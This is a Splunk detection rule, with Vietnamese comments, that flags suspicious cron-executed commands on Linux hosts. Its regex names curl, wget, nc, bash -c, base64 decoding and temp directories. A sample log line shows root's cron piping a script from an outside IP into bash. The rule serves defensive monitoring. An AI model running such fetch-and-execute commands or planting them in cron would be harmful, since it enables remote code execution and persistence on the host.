# Rule đã ổn => thay bằng macro linux_secure
index=vpa_os_linux sourcetype=linux_secure "CRON[" "CMD ("
| lookup vpa_linux.csv hostname OUTPUT src_ip
| where isnotnull(src_ip)
| rename hostname as dest
| rex field=_raw "CRON\[\d+\]:\s+\((?<user>[^\)]+)\)\s+CMD\s+\((?<process>.*)\)$"
| where isnotnull(user) AND isnotnull(process)
| where match(process, "(?i)(/tmp/|/var/tmp/|/dev/shm/|curl\\s+|wget\\s+|nc\\s+|bash\\s+-c|sh\\s+-c|python\\s+-c|perl\\s+-e|base64\\s+-d|chmod\\s+\\+x|\\.sh($|\\s)|/bin/bash|/bin/sh)")
| eval app="cron"
| eval action="execute"
| eval signature="suspicious_cron_command_execution"
| eval first_seen=strftime(_time,"%Y-%m-%d %H:%M:%S")
| table _time tenant src_ip dest user app action signature process first_seen

# CRON thực thi lệnh đáng ngờ
#SAMPLE
'''
Mar 28 00:10:11 server1 CRON[24567]: (root) CMD (curl http://203.0.113.10/a.sh | bash)
Mar 28 00:12:44 server1 CRON[24588]: (www-data) CMD (/tmp/update.sh)
'''